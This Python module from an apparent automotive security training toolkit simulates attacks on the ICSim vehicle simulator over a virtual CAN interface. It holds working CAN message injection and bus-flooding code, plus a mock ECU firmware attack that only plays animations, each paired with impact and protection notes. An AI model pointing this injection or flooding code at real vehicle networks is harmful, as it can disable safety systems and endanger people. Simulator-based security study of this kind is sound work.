#!/usr/bin/env python3
"""
Automobile Security Testing Module for xharvester
Improved version with better error handling, threading safety, and configuration management

Author: Network(GHANA)
Version: 2.0
"""

import os
import sys
import time
import random
import threading
from typing import Optional, Dict, List, Any, Tuple
import can
from can import CanError, Message

# Import configuration and utilities
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import Config, Colors, MenuConfig
from utils import (
    Animation, SystemUtils, MenuRenderer, Logger, error_handler,
    InputValidator, SecurityError
)


class CANAttackSimulator:
    """CAN bus attack simulation utilities"""
    
    def __init__(self, bus: Optional[can.BusABC], logger):
        self.bus = bus
        self.logger = logger
    
    def inject_message(self, can_id: int, data: List[int]) -> bool:
        """Inject a single CAN message"""
        try:
            if not self.bus:
                self.logger.warning("No CAN bus connection - simulating injection")
                return False
            
            message = Message(arbitration_id=can_id, data=data, is_extended_id=False)
            self.bus.send(message)
            return True
            
        except Exception as e:
            self.logger.error(f"CAN message injection failed: {e}")
            return False
    
    def flood_messages(self, duration: int, rate: int, can_ids: List[int]) -> int:
        """Flood CAN bus with messages"""
        msg_count = 0
        start_time = time.time()
        
        try:
            while (time.time() - start_time) < duration:
                if not self.bus:
                    break
                
                can_id = random.choice(can_ids)
                data = [random.randint(0, 255) for _ in range(random.randint(1, 8))]
                
                if self.inject_message(can_id, data):
                    msg_count += 1
                    
                time.sleep(1/rate)
                
        except Exception as e:
            self.logger.error(f"CAN flooding error: {e}")
        
        return msg_count


class AutomobileModule:
    """Enhanced automobile security testing module with improved error handling"""
    
    def __init__(self):
        self.logger = Logger.get_logger("automobile_module")
        self.can_interface = Config.DEFAULT_CAN_INTERFACE
        self.bus: Optional[can.BusABC] = None
        self.simulation_active = False
        self.hostname = SystemUtils.get_hostname()
        self._lock = threading.Lock()
        self.attack_simulator: Optional[CANAttackSimulator] = None
        
        self.logger.info("Automobile module initialized")
        
        # Setup CAN interface on initialization
        self.setup_can_interface()
    
    def __del__(self):
        """Cleanup resources on object destruction"""
        self.cleanup()
    
    def cleanup(self) -> None:
        """Clean up resources and stop any running operations"""
        with self._lock:
            self.simulation_active = False
            if self.bus:
                try:
                    self.bus.shutdown()
                    self.logger.info("CAN bus connection closed")
                except Exception as e:
                    self.logger.warning(f"Error closing CAN bus: {e}")
            self.setdown_can_interface()
    
    def setup_can_interface(self) -> bool:
        """Set up CAN interface for simulation with improved error handling"""
        with error_handler("setting up CAN interface", self.logger):
            try:
                # Validate CAN interface name
                InputValidator.validate_can_interface(self.can_interface)
                
                # Check if virtual CAN interface is available
                if os.system(f"ip link show {self.can_interface} > /dev/null 2>&1") != 0:
                    print(f"\n{Colors.ERROR}  CAN interface {Colors.CYAN}{self.can_interface}{Colors.ERROR} not found!")
                    Animation.show_loading("Creating virtual CAN interface for ICSim", 2)
                    
                    # Create virtual CAN interface
                    cmd = f"sudo modprobe vcan && sudo ip link add dev {self.can_interface} type vcan && sudo ip link set up {self.can_interface}"
                    result = os.system(cmd)
                    
                    if result != 0:
                        raise RuntimeError("Failed to create virtual CAN interface")
                
                # Initialize CAN bus
                self.bus = can.interface.Bus(channel=self.can_interface, bustype='socketcan')
                self.attack_simulator = CANAttackSimulator(self.bus, self.logger)
                
                print(f"{Colors.SUCCESS}  Connected to CAN interface:{Colors.CYAN} {self.can_interface}{Colors.RESET}")
                self.logger.info(f"CAN interface {self.can_interface} setup successful")
                return True
                
            except Exception as e:
                error_msg = f"Failed to setup CAN interface: {e}"
                print(f"{Colors.ERROR}  {error_msg}")
                print(f"{Colors.WARNING}  Some features may not work without a proper CAN interface!{Colors.RESET}")
                self.logger.error(error_msg)
                return False
    
    def setdown_can_interface(self) -> bool:
        """Clean up CAN interface"""
        with error_handler("cleaning up CAN interface", self.logger):
            try:
                if os.system(f"ip link show {self.can_interface} > /dev/null 2>&1") == 0:
                    print(f"\n{Colors.SUCCESS}  CAN interface {Colors.CYAN}{self.can_interface}{Colors.SUCCESS} found!")
                    Animation.show_loading("Deleting virtual CAN interface", 1)
                    print(f"{Colors.ERROR}  Disconnected from CAN interface:{Colors.CYAN} {self.can_interface}{Colors.RESET}")
                    os.system(f"sudo ip link del dev {self.can_interface} type vcan")
                    self.logger.info(f"CAN interface {self.can_interface} cleaned up")
                
                return True
            except Exception as e:
                self.logger.warning(f"Error cleaning up CAN interface: {e}")
                return False
    
    def show_automobile_menu(self) -> None:
        """Display the automobile module menu"""
        Animation.display_banner()
        MenuRenderer.render_menu_header(f"XHARVESTER {Colors.YELLOW}-{Colors.CYAN} AUTOMOBILE MENU")
        
        # Define icons for menu options
        icons = {
            "1": "💉",
            "2": "💾", 
            "3": "📶",
            "4": "📡",
            "5": "🚫",
            "6": "👁️"
        }
        
        MenuRenderer.render_menu_options(MenuConfig.AUTOMOBILE_MENU_OPTIONS, icons)
        MenuRenderer.render_menu_footer()
    
    def can_message_injection(self) -> None:
        """Simulate CAN message injection attack with ICSim-specific IDs"""
        print(f"{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Starting CAN Message Injection simulation for ICSim")
        print(f"\n{Colors.INFO}  CAN Message Injection:{Colors.CYAN} Attacker injects malicious commands onto the vehicle's internal network via OBD-II PORT.")
        print(f"{Colors.INFO}  Impact:{Colors.CYAN} Can lead to unauthorized control of critical systems like brakes or steering.")
        print(f"{Colors.INFO}  Protection:{Colors.CYAN} Implement message authentication (e.g., SecOC) and network segmentation.{Colors.RESET}")
        
        with error_handler("CAN message injection", self.logger):
            # Display available target systems
            print(f"\n{Colors.MAGENTA}  Available target systems for ICSim:{Colors.RESET}")
            can_ids_list = list(Config.ICSIM_CAN_IDS.items())
            
            for i, (system, can_id) in enumerate(can_ids_list):
                print(f"{Colors.CYAN}  [{Colors.WHITE}{i}{Colors.CYAN}] {Colors.YELLOW}{system} {Colors.GREEN}({Colors.CYAN}ID: 0x{can_id:03X}{Colors.GREEN})")
            
            try:
                choice_input = input(f"\n{Colors.GREEN}  Select target system: {Colors.YELLOW}")
                choice = InputValidator.validate_integer(choice_input, 0, len(can_ids_list) - 1)
                
                system, can_id = can_ids_list[choice]
                
                # Get malicious data based on system
                malicious_data = self._get_injection_data(system)
                if malicious_data is None:
                    return
                
                # Get number of injections
                num_input = input(f"{Colors.GREEN}  Enter the number of CAN packets({Colors.RED}default {Colors.GREEN}= {Colors.CYAN}5{Colors.GREEN}):{Colors.YELLOW} ") or "5"
                num_injections = InputValidator.validate_integer(num_input, 1, 100)
                
                # Perform injection
                successful_injections = 0
                for i in range(num_injections):
                    time.sleep(0.5)
                    
                    if self.attack_simulator and self.attack_simulator.inject_message(can_id, malicious_data):
                        print(f"{Colors.SUCCESS}  [{i+1}/{num_injections}] Injected malicious CAN message to {system} (ID: 0x{can_id:03X})")
                        print(f"{Colors.BLUE}  Data:{Colors.YELLOW} {[hex(x) for x in malicious_data]}\\a")
                        successful_injections += 1
                    else:
                        print(f"{Colors.WARNING}  [{i+1}/{num_injections}] Would inject: {system} - ID: 0x{can_id:03X}, Data: {malicious_data}")
                
                print(f"\n{Colors.SUCCESS}  Injection complete! {successful_injections}/{num_injections} messages sent successfully.{Colors.RESET}")
                
            except ValueError as e:
                print(f"{Colors.ERROR}  Invalid input: {e}\\a{Colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}  Injection cancelled by user{Colors.RESET}")
    
    def _get_injection_data(self, system: str) -> Optional[List[int]]:
        """Get appropriate injection data based on the target system"""
        try:
            if system == "Speed":
                speed_input = input(f"{Colors.GREEN}  Enter speed value ({Colors.YELLOW}0-{Config.MAX_SPEED}{Colors.GREEN})({Colors.RED}default {Colors.GREEN}= {Colors.CYAN}0{Colors.GREEN}): {Colors.YELLOW}") or "0"
                speed = InputValidator.validate_integer(speed_input, 0, Config.MAX_SPEED)
                return [0, 0, 0, speed, 150]
                
            elif system == "RPM":
                rpm_input = input(f"{Colors.GREEN}  Enter RPM value ({Colors.YELLOW}0-{Config.MAX_RPM}{Colors.GREEN})({Colors.RED}default {Colors.GREEN}= {Colors.CYAN}0{Colors.GREEN}): {Colors.YELLOW}") or "0"
                rpm = InputValidator.validate_integer(rpm_input, 0, Config.MAX_RPM)
                return [rpm >> 8, rpm & 0xFF, 0, 0, 0, 0, 0, 0]
                
            elif system == "Turn_Signals":
                return [random.randint(0, 3), 0, 0, 0, 0, 0, 0, 0]
                
            else:
                return [random.randint(0, 255) for _ in range(8)]
                
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}{Colors.RESET}")
            return None
    
    def ecu_firmware_attack(self) -> None:
        """Simulate ECU firmware attack"""
        print(f"\n{Colors.INFO}  ECU Firmware Attack:{Colors.CYAN} Flashing malicious software onto a vehicle's electronic control units.")
        print(f"{Colors.INFO}  Impact:{Colors.CYAN} Permanently alters vehicle behavior, disables safety features, or bricks the ECU.")
        print(f"{Colors.INFO}  Protection:{Colors.CYAN} Use secure boot processes and cryptographically signed firmware updates.{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Starting ECU Firmware Attack...")
        
        with error_handler("ECU firmware attack simulation", self.logger):
            stages = [
                ("Extracting current ECU firmware", 2),
                ("Analyzing firmware for vulnerabilities", 2),
                ("Modifying firmware with malicious code", 2),
                ("Flashing modified firmware back to ECU", 2)
            ]
            
            for stage, duration in stages:
                Animation.show_loading(stage, duration)
            
            print(f"{Colors.SUCCESS}  ECU firmware compromised! Backdoor installed.")
            print(f"{Colors.ERROR}  Vehicle may behave unpredictably or be remotely controlled\\a{Colors.RESET}")
    
    def can_bus_flood(self) -> None:
        """Simulate CAN bus flooding attack with improved threading"""
        print(f"\n{Colors.INFO}  CAN Bus Flood:{Colors.CYAN} Flooding the network with high-priority messages to block communication.")
        print(f"{Colors.INFO}  Impact:{Colors.CYAN} Renders safety-critical systems unresponsive, potentially immobilizing the vehicle.")
        print(f"{Colors.INFO}  Protection:{Colors.CYAN} Deploy intrusion detection systems (IDS) to monitor for anomalous message rates.{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Starting CAN Bus Flood")
        
        with error_handler("CAN bus flooding", self.logger):
            try:
                duration_input = input(f"{Colors.GREEN}  Flood duration ({Colors.YELLOW}seconds{Colors.GREEN}) [{Colors.RED}default {Colors.GREEN}= {Colors.CYAN}{Config.DEFAULT_FLOOD_DURATION}{Colors.GREEN}]: {Colors.YELLOW}") or str(Config.DEFAULT_FLOOD_DURATION)
                duration = InputValidator.validate_integer(duration_input, Config.MIN_FLOOD_DURATION, Config.MAX_FLOOD_DURATION)
                
                priority = input(f"{Colors.CYAN}  Message priority [{Colors.RED}high{Colors.GREEN}/{Colors.YELLOW}medium{Colors.GREEN}/low, {Colors.MAGENTA}default:{Colors.RED} high{Colors.GREEN}]: {Colors.YELLOW}") or "high"
                
                if priority.lower() not in Config.FLOOD_RATES:
                    priority = "high"
                
                rate = Config.FLOOD_RATES[priority.lower()]
                print(f"\n{Colors.CYAN}  [{Colors.RED}ℹ{Colors.CYAN}] Flooding CAN bus with {Colors.MAGENTA}{priority}{Colors.CYAN} priority messages for {Colors.MAGENTA}{duration}{Colors.CYAN} seconds...")
                
                # Vehicle-specific CAN IDs to target
                icsim_ids = list(Config.ICSIM_CAN_IDS.values())
                
                # Start flooding with proper thread management
                with self._lock:
                    self.simulation_active = True
                
                def flood_worker():
                    if self.attack_simulator:
                        return self.attack_simulator.flood_messages(duration, rate, icsim_ids)
                    return 0
                
                flood_thread = threading.Thread(target=flood_worker, daemon=True)
                flood_thread.start()
                
                # Show progress
                for i in range(duration):
                    if not self.simulation_active:
                        break
                    print(f"{Colors.YELLOW}  Flooding... {Colors.RED}{i+1}/{Colors.GREEN}{duration} {Colors.YELLOW}seconds", end="\r")
                    time.sleep(1)
                
                with self._lock:
                    self.simulation_active = False
                
                flood_thread.join(timeout=5)
                
                print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}]{Colors.SUCCESS} CAN bus flood completed!")
                print(f"{Colors.WARNING}  Vehicle may become unresponsive or display erratic behavior!\\a{Colors.RESET}")
                
            except ValueError as e:
                print(f"{Colors.ERROR}  Invalid input: {e}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.ERROR}  Flooding failed: {e}{Colors.RESET}")
                with self._lock:
                    self.simulation_active = False
    
    def handle_not_implemented(self, feature: str) -> None:
        """Handle not yet implemented features"""
        message = f"\t\t\t{Colors.ERROR}{feature} not implemented yet!\\a"
        Animation.typewriter_line(message)
        self.logger.info(f"User accessed unimplemented feature: {feature}")
    
    def main(self) -> None:
        """Main automobile module loop with improved error handling"""
        try:
            while True:
                try:
                    SystemUtils.clear_screen()
                    self.show_automobile_menu()
                    choice = MenuRenderer.get_user_input(self.hostname)
                    
                    if choice == "0":
                        Animation.typewriter_line(f"{Colors.MAGENTA}\n\t\t\t🚪🔙{Colors.YELLOW} Returning to menu...\n")
                        self.cleanup()
                        break
                    elif choice == "1":
                        self.can_message_injection()
                    elif choice == "2":
                        self.ecu_firmware_attack()
                    elif choice == "3":
                        self.handle_not_implemented("Wireless Gateway Exploit")
                    elif choice == "4":
                        self.handle_not_implemented("Sensor Spoofing")
                    elif choice == "5":
                        self.can_bus_flood()
                    elif choice == "6":
                        self.handle_not_implemented("Real-time CAN Monitor")
                    else:
                        Animation.typewriter_line(f"\n\t\t\t{Colors.WARNING}'{choice}' is not a valid option!{Colors.RESET}")
                    
                    if choice != "0":
                        input(f"\n  {Colors.GREEN}Press Enter to continue...{Colors.RESET}")
                        
                except (KeyboardInterrupt, EOFError):
                    Animation.typewriter_line(f"\n\n\t\t\t{Colors.MAGENTA}🚪🔙{Colors.YELLOW} Returning to menu...\n")
                    self.cleanup()
                    break
                    
        except Exception as e:
            self.logger.error(f"Automobile module error: {e}", exc_info=True)
            print(f"{Colors.ERROR}Module error: {e}{Colors.RESET}")
        finally:
            self.cleanup()


if __name__ == "__main__":
    try:
        auto = AutomobileModule()
        auto.main()
    except Exception as e:
        print(f"Critical error: {e}")